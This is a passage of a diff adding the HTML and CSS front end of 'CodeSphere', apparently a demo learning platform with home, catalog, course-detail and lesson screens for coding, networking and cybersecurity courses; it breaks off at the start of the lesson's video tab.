@@ -1,0 +1,2494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CodeSphere // Open-Source Tech LMS</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+  <style>
+:root{
+  --bg:       #0b0f19;
+  --bg2:      #111827;
+  --bg3:      #1f2937;
+  --bg4:      #374151;
+  --border:   #374151;
+  --border2:  #4b5563;
+  --green:    #00ff66;
+  --green-bg: rgba(0,255,102,0.12);
+  --blue:     #38bdf8;
+  --blue-bg:  rgba(56,189,248,0.12);
+  --orange:   #fb923c;
+  --red:      #f87171;
+  --text:     #f9fafb;
+  --text-sub: #e5e7eb;
+  --muted:    #9ca3af;
+  --fmono:    'JetBrains Mono', monospace;
+  --forb:     'Orbitron', sans-serif;
+  --t:        all 0.2s ease;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: var(--fmono);
+  background: var(--bg);
+  color: var(--text);
+  font-size: 14px;
+  line-height: 1.6;
+  overflow-x: hidden;
+}
+
+h1, h2, h3, h4 { font-family: var(--forb); line-height: 1.3; color: var(--text); }
+button { cursor: pointer; font-family: var(--fmono); }
+a { color: var(--green); text-decoration: none; }
+p { color: var(--text-sub); }
+
+.screen { display: none; }
+.screen.active { display: block; animation: fadeIn 0.15s ease both; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
+
+/* NAVBAR */
+.nav {
+  position: sticky; top: 0; z-index: 200;
+  background: #0b0f19;
+  border-bottom: 2px solid var(--green);
+  box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+}
+.nav-inner { max-width: 1320px; margin: 0 auto; padding: 0 20px; height: 60px; display: flex; align-items: center; justify-content: space-between; }
+.logo { display: flex; align-items: center; gap: 10px; cursor: pointer; font-family: var(--forb); font-size: 18px; font-weight: 700; color: var(--text); }
+.logo-green { color: var(--green); }
+.nav-r { display: flex; align-items: center; gap: 12px; }
+.nav-status { display: flex; align-items: center; gap: 8px; font-size: 12px; color: var(--green); background: var(--green-bg); padding: 4px 10px; border-radius: 4px; border: 1px solid var(--green); }
+.status-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--green); }
+
+.nav-btn { background: transparent; border: 1px solid var(--border2); color: var(--text-sub); font-size: 12px; padding: 7px 16px; cursor: pointer; transition: var(--t); font-weight: 600; border-radius: 4px; }
+.nav-btn:hover { border-color: var(--green); color: var(--green); background: var(--green-bg); }
+.nav-btn-p { background: var(--green); color: #000; border: 1px solid var(--green); font-weight: 700; font-size: 12px; padding: 7px 16px; cursor: pointer; transition: var(--t); border-radius: 4px; }
+.nav-btn-p:hover { background: #00cc52; box-shadow: 0 0 15px rgba(0,255,102,0.4); }
+
+.dbar {
+  background: var(--bg2); border-bottom: 1px solid var(--border);
+  padding: 8px 20px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
+  position: sticky; top: 60px; z-index: 190;
+}
+.dlabel { font-size: 12px; color: var(--green); font-weight: 700; margin-right: 4px; }
+.dbtn { padding: 5px 14px; font-size: 12px; font-family: var(--fmono); border: 1px solid var(--border2); background: var(--bg3); color: var(--text-sub); cursor: pointer; transition: var(--t); border-radius: 3px; }
+.dbtn:hover { border-color: var(--green); color: var(--text); }
+.dbtn.on { background: var(--green); color: #000; border-color: var(--green); font-weight: 700; }
+
+.c { max-width: 1320px; margin: 0 auto; padding: 0 20px; }
+
+.term-win { border: 1px solid var(--border2); background: var(--bg2); border-radius: 6px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
+.term-win-hd {
+  background: var(--bg3); border-bottom: 1px solid var(--border);
+  padding: 10px 16px; display: flex; align-items: center; gap: 10px;
+}
+.term-dots { display: flex; gap: 6px; }
+.tdot { width: 12px; height: 12px; border-radius: 50%; }
+.td-r { background: #ef4444; } .td-y { background: #f59e0b; } .td-g { background: #10b981; }
+.term-win-title { font-size: 12px; color: var(--muted); flex: 1; text-align: center; font-weight: 600; }
+.term-body { padding: 20px; font-family: var(--fmono); }
+
+.btn { display: inline-flex; align-items: center; gap: 8px; padding: 10px 22px; font-size: 13px; font-family: var(--fmono); font-weight: 700; border: none; cursor: pointer; transition: var(--t); border-radius: 4px; }
+.btn-g { background: var(--green); color: #000; border: 1px solid var(--green); }
+.btn-g:hover { background: #00cc52; box-shadow: 0 0 16px rgba(0,255,102,0.4); }
+.btn-o { background: transparent; border: 1px solid var(--green); color: var(--green); }
+.btn-o:hover { background: var(--green-bg); }
+.btn-b { background: transparent; border: 1px solid var(--blue); color: var(--blue); }
+.btn-b:hover { background: var(--blue-bg); }
+.btn-ghost { background: var(--bg3); border: 1px solid var(--border); color: var(--text-sub); }
+.btn-ghost:hover { border-color: var(--border2); color: var(--text); background: var(--bg4); }
+.btn-sm { padding: 6px 14px; font-size: 12px; }
+.btn-lg { padding: 14px 28px; font-size: 15px; }
+
+.bdg { display: inline-block; padding: 3px 10px; font-size: 11px; font-weight: 700; text-transform: uppercase; font-family: var(--fmono); border: 1px solid; border-radius: 3px; }
+.bdg-g { border-color: var(--green); color: var(--green); background: var(--green-bg); }
+.bdg-b { border-color: var(--blue); color: var(--blue); background: var(--blue-bg); }
+.bdg-o { border-color: var(--orange); color: var(--orange); background: rgba(251,146,60,0.12); }
+
+/* HOME SCREEN */
+.hero { padding: 50px 0 30px; }
+.hero-layout { display: grid; grid-template-columns: 1fr 440px; gap: 40px; align-items: center; }
+.hero-pre { font-size: 13px; color: var(--green); font-family: var(--fmono); margin-bottom: 12px; font-weight: 600; }
+.hero-title { font-size: clamp(32px, 4vw, 54px); font-weight: 900; margin-bottom: 16px; color: var(--text); }
+.hero-title .gt { color: var(--green); }
+.hero-desc { font-size: 15px; color: var(--text-sub); line-height: 1.8; margin-bottom: 28px; }
+.hero-btns { display: flex; gap: 14px; flex-wrap: wrap; margin-bottom: 30px; }
+
+.stats-row { display: flex; gap: 28px; flex-wrap: wrap; background: var(--bg2); padding: 18px 24px; border: 1px solid var(--border); border-radius: 6px; }
+.stat-item { display: flex; flex-direction: column; gap: 2px; }
+.stat-val { font-family: var(--forb); font-size: 26px; font-weight: 900; color: var(--green); }
+.stat-lbl { font-size: 12px; color: var(--muted); }
+
+.term-line { display: flex; gap: 10px; margin-bottom: 6px; font-size: 13px; }
+.t-prompt { color: var(--green); font-weight: 700; }
+.t-cmd { color: var(--text); font-weight: 600; }
+.t-out { color: var(--text-sub); padding-left: 18px; }
+.t-ok { color: var(--green); font-weight: 600; }
+.t-info { color: var(--blue); }
+
+.cat-section { padding: 40px 0; border-top: 1px solid var(--border); }
+.section-hd { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+.section-title { font-size: 20px; color: var(--text); font-family: var(--forb); font-weight: 700; }
+.cat-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+.cat-card {
+  background: var(--bg2); border: 1px solid var(--border);
+  padding: 18px; cursor: pointer; transition: var(--t); border-radius: 6px;
+}
+.cat-card:hover { border-color: var(--green); background: var(--bg3); }
+.cat-card.on { border-color: var(--green); background: var(--green-bg); }
+.cat-icon { font-size: 24px; margin-bottom: 8px; display: block; }
+.cat-name { font-size: 13px; font-weight: 700; color: var(--text); }
+.cat-count { font-size: 12px; color: var(--muted); margin-top: 4px; }
+
+.course-section { padding: 40px 0; border-top: 1px solid var(--border); }
+.course-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
+.cc {
+  background: var(--bg2); border: 1px solid var(--border);
+  cursor: pointer; transition: var(--t); overflow: hidden; border-radius: 6px;
+  display: flex; flex-direction: column;
+}
+.cc:hover { border-color: var(--green); transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+.cc-thumb img { width: 100%; height: 170px; object-fit: cover; display: block; border-bottom: 1px solid var(--border); }
+.cc-body { padding: 18px; flex: 1; display: flex; flex-direction: column; }
+.cc-cat { font-size: 11px; color: var(--green); font-weight: 700; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.05em; }
+.cc-title { font-size: 15px; font-weight: 700; color: var(--text); line-height: 1.4; margin-bottom: 8px; }
+.cc-desc { font-size: 13px; color: var(--text-sub); line-height: 1.6; margin-bottom: 16px; flex: 1; }
+.cc-meta { display: flex; align-items: center; justify-content: space-between; font-size: 12px; color: var(--muted); padding-top: 12px; border-top: 1px solid var(--border); }
+
+/* CATALOG SCREEN */
+.catalog-hd { padding: 36px 0 20px; border-bottom: 1px solid var(--border); background: var(--bg2); }
+.search-bar { display: flex; gap: 10px; margin: 18px 0; align-items: center; }
+.search-wrap { flex: 1; position: relative; }
+.search-wrap input { width: 100%; padding: 12px 14px 12px 40px; background: var(--bg3); border: 1px solid var(--border2); color: var(--text); font-family: var(--fmono); font-size: 14px; border-radius: 4px; outline: none; }
+.search-wrap input:focus { border-color: var(--green); }
+.search-wrap::before { content: '🔍'; position: absolute; left: 14px; top: 50%; transform: translateY(-50%); }
+.filter-row { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 14px; }
+.ftab { padding: 6px 14px; font-size: 12px; font-family: var(--fmono); border: 1px solid var(--border2); background: var(--bg3); color: var(--text-sub); cursor: pointer; transition: var(--t); border-radius: 4px; }
+.ftab:hover, .ftab.on { border-color: var(--green); color: #000; background: var(--green); font-weight: 700; }
+
+/* COURSE DETAIL */
+.cd-hd { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 36px 0; }
+.cd-layout { display: grid; grid-template-columns: 1fr 340px; gap: 40px; }
+.cd-breadcrumb { font-size: 12px; color: var(--muted); margin-bottom: 12px; display: flex; gap: 8px; }
+.cd-breadcrumb span { cursor: pointer; color: var(--green); }
+.cd-cat { font-size: 12px; color: var(--green); font-weight: 700; margin-bottom: 8px; }
+.cd-title { font-size: clamp(22px, 3vw, 34px); font-weight: 900; color: var(--text); margin-bottom: 12px; }
+.cd-desc { font-size: 14px; color: var(--text-sub); line-height: 1.8; margin-bottom: 20px; }
+.cd-meta { display: flex; gap: 16px; flex-wrap: wrap; font-size: 13px; color: var(--text-sub); margin-bottom: 20px; }
+
+.enroll-panel { background: var(--bg2); border: 1px solid var(--border2); border-radius: 6px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+.ep-thumb img { width: 100%; height: 180px; object-fit: cover; display: block; }
+.ep-body { padding: 22px; }
+.ep-free { font-family: var(--forb); font-size: 28px; font-weight: 900; color: var(--green); }
+.ep-sub { font-size: 12px; color: var(--muted); margin-bottom: 18px; }
+.ep-btn { width: 100%; justify-content: center; margin-bottom: 12px; }
+.ep-list { list-style: none; font-size: 13px; color: var(--text-sub); }
+.ep-list li { padding: 6px 0; border-bottom: 1px solid var(--border); display: flex; gap: 8px; }
+.ep-list li::before { content: '✓'; color: var(--green); font-weight: 700; }
+
+.cd-body { padding: 40px 0; }
+.cd-main { display: grid; grid-template-columns: 1fr 340px; gap: 40px; }
+.tab-bar { display: flex; border-bottom: 2px solid var(--border); margin-bottom: 24px; }
+.cstab { padding: 12px 20px; border: none; background: transparent; color: var(--muted); font-size: 13px; font-family: var(--fmono); cursor: pointer; transition: var(--t); font-weight: 700; border-bottom: 3px solid transparent; margin-bottom: -2px; }
+.cstab:hover { color: var(--text); }
+.cstab.on { color: var(--green); border-bottom-color: var(--green); }
+.cspanel { display: none; }
+.cspanel.on { display: block; }
+
+.mod-list { display: flex; flex-direction: column; gap: 10px; }
+.mod { border: 1px solid var(--border); background: var(--bg2); border-radius: 6px; overflow: hidden; }
+.mod-hd { display: flex; align-items: center; justify-content: space-between; padding: 14px 18px; cursor: pointer; background: var(--bg3); transition: var(--t); }
+.mod-hd:hover { background: var(--bg4); }
+.mod-name { font-size: 14px; font-weight: 700; color: var(--text); }
+.mod-dur { font-size: 12px; color: var(--muted); }
+.mod-lessons { border-top: 1px solid var(--border); }
+.lesson-item { display: flex; align-items: center; gap: 12px; padding: 12px 20px; cursor: pointer; transition: var(--t); border-bottom: 1px solid var(--border); font-size: 13px; color: var(--text-sub); }
+.lesson-item:last-child { border: none; }
+.lesson-item:hover { background: var(--green-bg); color: var(--text); }
+.lesson-item.active-lesson { background: var(--green-bg); color: var(--green); font-weight: 700; border-left: 4px solid var(--green); }
+
+/* LESSON & QUIZ */
+.lesson-layout { display: grid; grid-template-columns: 1fr 340px; gap: 32px; padding: 32px 0; }
+.lesson-title { font-size: clamp(20px, 2.5vw, 26px); font-weight: 700; color: var(--text); margin-bottom: 20px; font-family: var(--forb); }
+
+.ltabs { display: flex; border-bottom: 2px solid var(--border); margin-bottom: 24px; gap: 4px; }
+.ltab { padding: 10px 22px; border: none; background: var(--bg2); color: var(--muted); font-size: 13px; font-family: var(--fmono); cursor: pointer; transition: var(--t); font-weight: 700; border-radius: 4px 4px 0 0; }
+.ltab:hover { color: var(--text); background: var(--bg3); }
+.ltab.on { color: #000; background: var(--green); }
+.lpanel { display: none; }
+.lpanel.on { display: block; }
+
+.vid-wrap { background: #000; border: 1px solid var(--border2); position: relative; padding-top: 56.25%; border-radius: 6px; overflow: hidden; margin-bottom: 18px; }
+.vid-wrap iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
+
+.reading { background: var(--bg2); border: 1px solid var(--border); padding: 32px; border-radius: 6px; }
+.reading h3 { font-size: 20px; font-weight: 700; color: var(--green); margin-bottom: 14px; }
+.reading h4 { font-size: 16px; font-weight: 700; color: var(--text); margin: 24px 0 12px; }
+.reading p { font-size: 14px; color: var(--text-sub); line-height: 1.8; margin-bottom: 14px; }
+.reading ul { margin-left: 20px; margin-bottom: 16px; color: var(--text-sub); }
+.reading ul li { margin-bottom: 6px; }
+
+.code-block {
+  background: #050811; border: 1px solid var(--border2); border-left: 4px solid var(--green);
+  padding: 18px; margin: 16px 0; font-family: var(--fmono); font-size: 13px;
+  color: #f9fafb; border-radius: 4px; overflow-x: auto; line-height: 1.7;
+}
+.kw { color: #38bdf8; font-weight: 700; }
+.str { color: #fbbf24; }
+.cm { color: #9ca3af; font-style: italic; }
+.fn { color: #34d399; font-weight: 700; }
+
+.note-box {
+  background: var(--blue-bg); border: 1px solid var(--blue);
+  padding: 14px 18px; margin: 18px 0; font-size: 13px; color: var(--text);
+  border-radius: 4px; display: flex; gap: 12px; align-items: center;
+}
+
+.quiz-wrap { background: var(--bg2); border: 1px solid var(--border); padding: 32px; border-radius: 6px; }
+.quiz-hd { font-size: 20px; font-weight: 700; color: var(--green); margin-bottom: 6px; font-family: var(--forb); }
+.quiz-sub { font-size: 13px; color: var(--muted); margin-bottom: 24px; }
+.q-item { margin-bottom: 24px; background: var(--bg3); padding: 18px; border-radius: 6px; border: 1px solid var(--border); }
+.q-text { font-size: 15px; font-weight: 700; color: var(--text); margin-bottom: 14px; }
+.q-opts { display: flex; flex-direction: column; gap: 8px; }
+.q-opt {
+  display: flex; align-items: center; gap: 12px; padding: 12px 16px;
+  border: 1px solid var(--border2); background: var(--bg2); cursor: pointer; transition: var(--t);
+  font-size: 14px; color: var(--text-sub); border-radius: 4px; font-weight: 500;
+}
+.q-opt:hover { border-color: var(--green); color: var(--text); background: var(--bg4); }
+.q-opt.selected { border-color: var(--green); color: var(--text); background: var(--green-bg); }
+.q-opt.correct { border-color: var(--green) !important; color: var(--text) !important; background: rgba(0,255,102,0.2) !important; }
+.q-opt.wrong { border-color: var(--red) !important; color: var(--text) !important; background: rgba(248,113,113,0.2) !important; }
+.q-opt-tag { width: 24px; height: 24px; border: 1px solid var(--border2); display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; border-radius: 3px; background: var(--bg3); }
+.q-opt.selected .q-opt-tag { background: var(--green); color: #000; }
+
+.quiz-result {
+  background: var(--bg3); border: 2px solid var(--green); padding: 24px;
+  margin-top: 24px; display: none; text-align: center; border-radius: 6px;
+}
+.qr-score { font-family: var(--forb); font-size: 36px; font-weight: 900; color: var(--green); margin: 8px 0; }
+
+.ls-list { background: var(--bg2); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; }
+.ls-list-hd { padding: 12px 16px; background: var(--bg3); border-bottom: 1px solid var(--border); font-size: 12px; color: var(--green); font-weight: 700; }
+.ls-item { display: flex; align-items: center; gap: 12px; padding: 12px 16px; cursor: pointer; transition: var(--t); font-size: 13px; color: var(--text-sub); border-bottom: 1px solid var(--border); }
+.ls-item:last-child { border: none; }
+.ls-item:hover { background: var(--bg3); color: var(--text); }
+.ls-item.on { background: var(--green-bg); color: var(--green); font-weight: 700; border-left: 4px solid var(--green); }
+
+/* AUTH */
+.auth-pg { min-height: calc(100vh - 140px); display: flex; align-items: center; justify-content: center; padding: 40px 16px; }
+.auth-card { width: 100%; max-width: 440px; background: var(--bg2); border: 1px solid var(--border2); border-radius: 8px; overflow: hidden; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
+.auth-hd { background: var(--bg3); border-bottom: 1px solid var(--border); padding: 24px; text-align: center; }
+.auth-logo { font-family: var(--forb); font-size: 22px; font-weight: 900; color: var(--text); }
+.auth-body { padding: 28px; }
+.fg { margin-bottom: 18px; }
+.fl { display: block; font-size: 12px; color: var(--text); font-weight: 600; margin-bottom: 8px; }
+.fi { width: 100%; padding: 12px 14px; background: var(--bg3); border: 1px solid var(--border2); color: var(--text); font-family: var(--fmono); font-size: 14px; border-radius: 4px; outline: none; }
+.fi:focus { border-color: var(--green); }
+
+/* DASHBOARD */
+.db-layout { max-width: 1320px; margin: 0 auto; padding: 32px 20px; display: grid; grid-template-columns: 260px 1fr; gap: 28px; }
+.db-user { background: var(--bg2); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; }
+.db-user-hd { background: var(--bg3); border-bottom: 1px solid var(--border); padding: 20px; display: flex; align-items: center; gap: 14px; }
+.db-av { width: 48px; height: 48px; background: var(--green); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 700; color: #000; font-family: var(--forb); }
+.db-name { font-size: 15px; font-weight: 700; color: var(--text); }
+.db-email { font-size: 12px; color: var(--muted); }
+.db-nav { background: var(--bg2); border: 1px solid var(--border); border-radius: 6px; margin-top: 16px; overflow: hidden; }
+.db-navlink { display: flex; align-items: center; gap: 12px; padding: 12px 16px; border: none; background: transparent; color: var(--text-sub); font-size: 13px; font-family: var(--fmono); cursor: pointer; transition: var(--t); width: 100%; text-align: left; border-bottom: 1px solid var(--border); font-weight: 600; }
+.db-navlink:hover { background: var(--bg3); color: var(--text); }
+.db-navlink.on { background: var(--green); color: #000; font-weight: 700; }
+
+.db-sec { display: none; }
+.db-sec.on { display: block; }
+.db-hd { font-size: 20px; font-weight: 700; color: var(--text); margin-bottom: 20px; font-family: var(--forb); }
+.db-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-bottom: 28px; }
+.db-stat { background: var(--bg2); border: 1px solid var(--border); padding: 20px; border-radius: 6px; }
+.db-stat-n { font-family: var(--forb); font-size: 32px; font-weight: 900; color: var(--green); }
+.db-stat-l { font-size: 12px; color: var(--muted); margin-top: 4px; }
+
+.enrolled-list { display: flex; flex-direction: column; gap: 12px; }
+.enr { background: var(--bg2); border: 1px solid var(--border); padding: 18px; border-radius: 6px; display: flex; gap: 16px; align-items: center; cursor: pointer; transition: var(--t); }
+.enr:hover { border-color: var(--green); background: var(--bg3); }
+.enr-title { font-size: 15px; font-weight: 700; color: var(--text); }
+.enr-sub { font-size: 12px; color: var(--muted); margin-top: 4px; }
+
+@media(max-width:900px){
+  .hero-layout, .cd-layout, .cd-main, .lesson-layout, .db-layout { grid-template-columns: 1fr; }
+  .course-grid, .cat-grid { grid-template-columns: 1fr 1fr; }
+}
+@media(max-width:600px){
+  .course-grid, .cat-grid, .db-stats { grid-template-columns: 1fr; }
+}
+  </style>
+</head>
+<body>
+
+<div class="wrap">
+
+<!-- NAVBAR -->
+<nav class="nav">
+  <div class="nav-inner">
+    <div class="logo" onclick="go('home')">
+      [<span class="logo-name">Code</span><span class="logo-green">Sphere</span>]
+    </div>
+    <div class="nav-r">
+      <div class="nav-status">
+        <span class="status-dot"></span>
+        <span>OPEN ACCESS LMS</span>
+      </div>
+      <button class="nav-btn" onclick="go('catalog')">COURSES</button>
+      <div id="navRight">
+        <button class="nav-btn" onclick="go('auth')" style="margin-right:6px">SIGN IN</button>
+        <button class="nav-btn-p" onclick="go('auth')">GET ACCESS (FREE)</button>
+      </div>
+    </div>
+  </div>
+</nav>
+
+<!-- DEMO NAVIGATION BAR -->
+<div class="dbar">
+  <span class="dlabel">NAVIGATE:</span>
+  <button class="dbtn on" id="btn-home"     onclick="go('home')">HOME</button>
+  <button class="dbtn"    id="btn-catalog"  onclick="go('catalog')">CATALOG</button>
+  <button class="dbtn"    id="btn-course"   onclick="go('course')">COURSE DETAIL</button>
+  <button class="dbtn"    id="btn-lesson"   onclick="go('lesson')">LESSON + QUIZ</button>
+  <button class="dbtn"    id="btn-auth"     onclick="go('auth')">AUTH</button>
+  <button class="dbtn"    id="btn-dashboard" onclick="go('dashboard')">DASHBOARD</button>
+</div>
+
+<!-- ══════════════════════════════════
+     SCREEN 1: HOME
+══════════════════════════════════ -->
+<div id="screen-home" class="screen active">
+  <section class="hero">
+    <div class="c">
+      <div class="hero-layout">
+        <div>
+          <div class="hero-pre">// Open Source Learning System</div>
+          <h1 class="hero-title">
+            MASTER <span class="gt">CODING</span> &amp;<br/>
+            <span style="color:var(--blue)">CYBERSECURITY</span>
+          </h1>
+          <p class="hero-desc">
+            Learn Python, Cisco Networking, Ethical Hacking, Linux, and Web Dev with real embedded video lessons, structured reading guides, and auto-graded quizzes.
+          </p>
+          <div class="hero-btns">
+            <button class="btn btn-g btn-lg" onclick="go('catalog')">EXPLORE COURSES →</button>
+            <button class="btn btn-o btn-lg" onclick="loadCourse(0); go('course');">DEMO PYTHON COURSE</button>
+          </div>
+          <div class="stats-row">
+            <div class="stat-item"><span class="stat-val">6</span><span class="stat-lbl">Full Courses</span></div>
+            <div class="stat-item"><span class="stat-val">25+</span><span class="stat-lbl">Video Lessons</span></div>
+            <div class="stat-item"><span class="stat-val">100%</span><span class="stat-lbl">Free Access</span></div>
+          </div>
+        </div>
+
+        <div>
+          <div class="term-win">
+            <div class="term-win-hd">
+              <div class="term-dots"><div class="tdot td-r"></div><div class="tdot td-y"></div><div class="tdot td-g"></div></div>
+              <div class="term-win-title">codesphere_lms --status</div>
+            </div>
+            <div class="term-body">
+              <div class="term-line"><span class="t-prompt">$</span><span class="t-cmd">codesphere status</span></div>
+              <div class="term-line"><span class="t-out t-ok">[✓] Platform Status: ONLINE</span></div>
+              <div class="term-line"><span class="t-out t-ok">[✓] Videos &amp; Quizzes: ACTIVE</span></div>
+              <br/>
+              <div class="term-line"><span class="t-prompt">$</span><span class="t-cmd">list-featured-courses</span></div>
+              <div class="term-line"><span class="t-out t-info">[1] Python for Beginners (5 Lessons)</span></div>
+              <div class="term-line"><span class="t-out t-info">[2] Cybersecurity Essentials (4 Lessons)</span></div>
+              <div class="term-line"><span class="t-out t-info">[3] Cisco CCNA Networking (4 Lessons)</span></div>
+              <div class="term-line"><span class="t-out t-info">[4] Ethical Hacking &amp; Kali (4 Lessons)</span></div>
+              <br/>
+              <div class="term-line"><span class="t-prompt">$</span><span class="t-cmd">select-course --id=python</span></div>
+              <div class="term-line"><span class="t-out t-ok">[✓] Loaded modules &amp; complete video lessons!</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Categories -->
+  <section class="cat-section">
+    <div class="c">
+      <div class="section-hd">
+        <h2 class="section-title">Course Categories</h2>
+      </div>
+      <div class="cat-grid">
+        <div class="cat-card on" onclick="filterCat('ALL', this)"><span class="cat-icon">⚡</span><div class="cat-name">ALL COURSES</div><div class="cat-count">6 Available</div></div>
+        <div class="cat-card"    onclick="filterCat('PYTHON', this)"><span class="cat-icon">🐍</span><div class="cat-name">PYTHON</div><div class="cat-count">1 Available</div></div>
+        <div class="cat-card"    onclick="filterCat('CYBERSECURITY', this)"><span class="cat-icon">🔐</span><div class="cat-name">CYBERSECURITY</div><div class="cat-count">2 Available</div></div>
+        <div class="cat-card"    onclick="filterCat('NETWORKING', this)"><span class="cat-icon">🌐</span><div class="cat-name">CISCO / NETWORKING</div><div class="cat-count">1 Available</div></div>
+        <div class="cat-card"    onclick="filterCat('WEB DEVELOPMENT', this)"><span class="cat-icon">🖥️</span><div class="cat-name">WEB DEV</div><div class="cat-count">1 Available</div></div>
+        <div class="cat-card"    onclick="filterCat('LINUX', this)"><span class="cat-icon">🐧</span><div class="cat-name">LINUX</div><div class="cat-count">1 Available</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Featured Courses -->
+  <section class="course-section">
+    <div class="c">
+      <div class="section-hd">
+        <h2 class="section-title">Featured Courses</h2>
+        <button class="btn btn-o btn-sm" onclick="go('catalog')">View All →</button>
+      </div>
+      <div class="course-grid" id="home-grid"></div>
+    </div>
+  </section>
+</div>
+
+<!-- ══════════════════════════════════
+     SCREEN 2: CATALOG
+══════════════════════════════════ -->
+<div id="screen-catalog" class="screen">
+  <div class="catalog-hd">
+    <div class="c">
+      <h2>All Open-Source Courses</h2>
+      <p style="margin-top:4px;">Select any course to view full video modules, reading guides, and interactive quizzes.</p>
+      <div class="search-bar">
+        <div class="search-wrap">
+          <input type="text" id="searchInput" oninput="handleSearch()" placeholder="Search Python, Cisco, Security, Ethical Hacking, Linux..."/>
+        </div>
+      </div>
+      <div class="filter-row">
+        <button class="ftab on" onclick="filterCat('ALL', this)">ALL</button>
+        <button class="ftab"    onclick="filterCat('PYTHON', this)">PYTHON</button>
+        <button class="ftab"    onclick="filterCat('CYBERSECURITY', this)">CYBERSECURITY</button>
+        <button class="ftab"    onclick="filterCat('NETWORKING', this)">NETWORKING</button>
+        <button class="ftab"    onclick="filterCat('WEB DEVELOPMENT', this)">WEB DEV</button>
+        <button class="ftab"    onclick="filterCat('LINUX', this)">LINUX</button>
+      </div>
+    </div>
+  </div>
+  <div class="c" style="padding: 32px 20px 64px;">
+    <div class="course-grid" id="catalog-grid"></div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════
+     SCREEN 3: COURSE DETAIL
+══════════════════════════════════ -->
+<div id="screen-course" class="screen">
+  <div class="cd-hd">
+    <div class="c">
+      <div class="cd-layout">
+        <div>
+          <div class="cd-breadcrumb">
+            <span onclick="go('catalog')">Catalog</span> / <span id="cd-cat-crumb">Python</span> / <span id="cd-title-crumb" style="color:var(--text)">Python for Beginners</span>
+          </div>
+          <div class="cd-cat" id="cd-cat-tag">PYTHON PROGRAMMING</div>
+          <h1 class="cd-title" id="cd-title">Learn Python — From Zero to Real Projects</h1>
+          <p class="cd-desc" id="cd-desc">Master Python fundamentals from scratch. Covers variables, data structures, control loops, functions, file handling, and practical code projects.</p>
+          <div class="cd-meta">
+            <span id="cd-rating">⭐ 4.9 (2,400 reviews)</span>
+            <span id="cd-lessons-count">📖 5 lessons</span>
+            <span id="cd-hrs">⏱️ 8 hours</span>
+            <span class="bdg bdg-g" id="cd-level">BEGINNER</span>
+            <span class="bdg bdg-b">100% FREE</span>
+          </div>
+        </div>
+        <div class="enroll-panel">
+          <div class="ep-thumb"><img id="cd-thumb" src="https://img.youtube.com/vi/rfscVS0vtbw/mqdefault.jpg" alt="Course Thumbnail"/></div>
+          <div class="ep-body">
+            <div class="ep-free">FREE</div>
+            <div class="ep-sub">Full course access with no paywall</div>
+            <button class="btn btn-g ep-btn" id="btn-start-course" onclick="startCurrentCourse()">START LEARNING NOW →</button>
+            <ul class="ep-list">
+              <li>Structured Video Lessons</li>
+              <li>Reading Material &amp; Code Samples</li>
+              <li>Auto-Graded Quizzes</li>
+              <li>Certificate of Completion</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="cd-body">
+    <div class="c">
+      <div class="cd-main">
+        <div>
+          <div class="tab-bar">
+            <button class="cstab on" onclick="ctab(0)">CURRICULUM MODULES</button>
+            <button class="cstab"    onclick="ctab(1)">COURSE OUTCOMES</button>
+          </div>
+          <div class="cspanel on">
+            <div class="mod-list" id="cd-modules-list">
+              <!-- Modules dynamically populated -->
+            </div>
+            <div style="margin-top:24px;">
+              <button class="btn btn-g" onclick="startCurrentCourse()">LAUNCH LESSON 1.1 →</button>
+            </div>
+          </div>
+          <div class="cspanel">
+            <ul style="line-height:2.2; color:var(--text-sub); font-size:14px; margin-left:20px;" id="cd-outcomes">
+              <li>Master core concepts with step-by-step practical videos</li>
+              <li>Build real code &amp; network labs directly in your workspace</li>
+              <li>Validate skills with lesson quizzes and hands-on checks</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════
+     SCREEN 4: LESSON & QUIZ
+══════════════════════════════════ -->
+<div id="screen-lesson" class="screen">
+  <div class="c">
+    <div class="lesson-layout">
+      <div>
+        <div style="font-size:12px; color:var(--green); margin-bottom:10px; font-weight:700;" id="ls-header-tag">PYTHON FOR BEGINNERS // LESSON 1.1</div>
+        <h1 class="lesson-title" id="ls-title">Lesson 1.1: Introduction to Python</h1>
+        
+        <div class="ltabs">
+          <button class="ltab on" id="ltab-vid"  onclick="ltab(0)">▶ VIDEO LESSON</button>
+          <button class="ltab"    id="ltab-read" onclick="ltab(1)">📖 READING NOTES</button>
+          <button class="ltab"    id="ltab-quiz" onclick="ltab(2)">📝 TAKE QUIZ</button>
+        </div>
+
+        <!-- VIDEO TAB -->
